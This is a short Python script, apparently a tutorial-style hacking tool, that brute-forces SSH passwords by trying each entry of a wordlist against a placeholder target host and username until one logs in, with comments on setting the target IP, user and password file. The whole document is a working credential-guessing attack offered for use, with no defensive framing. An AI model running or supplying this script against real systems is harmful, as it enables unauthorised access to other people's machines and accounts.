from pwn import *
import paramiko

host = "targetIP"
username = "targetUser"
attempts = 0

with open("password_list.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1

#change line4 host to target IP like 127.0.0.1
#change line5 username to target username like "notroot"
#change line8 file name to file containing common passwords like ssh-common-passwords.txt